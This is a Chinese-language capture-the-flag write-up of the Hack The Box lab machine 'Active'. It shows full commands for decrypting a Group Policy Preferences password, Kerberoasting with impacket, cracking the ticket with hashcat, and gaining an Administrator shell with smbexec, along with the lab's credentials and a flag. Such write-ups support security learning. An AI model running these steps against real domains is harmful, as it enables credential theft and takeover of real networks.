+++
ShowToc = true
TocOpen = true
title = '0X012 Active'
date = 2024-10-11T14:25:59+08:00
draft = false
private = true
show_reading_time = true
categories = 'HTB'
+++



# 端口扫描

![](/htb_img/WEBRESOURCE2b79f81f1e994947facb32e1d33427b9image.png)

![](/htb_img/WEBRESOURCE57929fea3eb2c20e9a81cb222fdc2be2image.png)

# 获取立足点

开始思考，从哪儿开始看起呢？还是smba吧：

![](/htb_img/WEBRESOURCEe2ba0e29d1b9dba9ac848bc79d363f4dimage.png)

用smbclient简单看了一下，内容好像有点多，但是挂载到本地失败了，只能慢慢看了：

里面其实有东西的目录，应该就是这个目录了：

![](/htb_img/WEBRESOURCE929b2ab801ddc22197d678d5b7b5f4c3image.png)

问了一下GPT，大概知道是用来记录组策略的，但是不知道有什么用：

![](/htb_img/WEBRESOURCE87ab11f980a529d243a7b64203c532cfimage.png)

发现疑似账号密码：

![](/htb_img/WEBRESOURCEd7d244a94d67021c2c41a4546cb9562eimage.png)

这里其实是我的思考不够，其实我是知道这是普通账户，但是目标主机是域控的，但是我对这方面的知识不自信导致，我一直在尝试，通过这个账号密码来获取shell，并且这里的密码是加密的，需要解密：

gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

密码为：GPPstillStandingStrong2k18

![](/htb_img/WEBRESOURCE9bedd112f49203bcdfaa39d7ab9e3eb4image.png)

使用该凭证再次登录smb:

![](/htb_img/WEBRESOURCE440f4d2843d061cfa22720a98c061501image.png)

![](/htb_img/WEBRESOURCE08147a54fd1836d6a1164e3cc671b872image.png)

登录后发现flag:

![](/htb_img/WEBRESOURCE537bd27ee83c3e4a88037526309a618aimage.png)

# 提权

我尝试使用该凭证进行登录获取shell，但是发现都失败了，rpc拒绝或者相关smb目录没有写入权限；

![](/htb_img/WEBRESOURCE21b1337ec915a036acf313ff94cfe1e7image.png)

尝试获取其他立足点，其实我感觉这一步更像是域内提权枚举：

# kerberoasting

使用GetUserSPNs.py查询所有注册于用户下的spn:

python GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18

![](/htb_img/WEBRESOURCEd4ea9064ac216fbdda4e886205dc6e25image.png)

获取ST，保存为hashcat能爆破的格式：

python /home/kali/Desktop/HTB/impacket/examples/GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request -outputfile hash.txt

![](/htb_img/WEBRESOURCE88b2ee81d90310dae17659e624785e0aimage.png)

爆破：

hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt --force

Ticketmaster1968

![](/htb_img/WEBRESOURCE5b8fa2eeaa852240dda639d8e2f24790image.png)

smbexec:

python /usr/share/doc/python3-impacket/examples/smbexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100

![](/htb_img/WEBRESOURCEa5a3cf96a5145e1b772d8e1833e034b1image.png)

2ad2d3d25064e6511303bc5a1bb40ac4

![](/htb_img/WEBRESOURCEec1777129985a3276298ae0bd26f2258image.png)